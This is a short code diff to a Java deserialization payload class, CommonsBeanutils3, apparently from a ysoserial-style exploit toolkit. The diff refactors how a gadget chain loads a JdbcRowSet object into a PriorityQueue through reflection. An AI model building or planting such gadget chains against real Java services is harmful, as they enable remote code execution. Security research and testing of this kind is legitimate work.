@@ -28,10 +28,9 @@ public class CommonsBeanutils3 implements ObjectPayload<Object> {
 
 		queue.add(new BigInteger("1"));
 		queue.add(new BigInteger("1"));
+
 		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
-		Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-		queueArray[0] = rs;
-		queueArray[1] = rs;
+		Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});
 		return queue;
 	}
 }
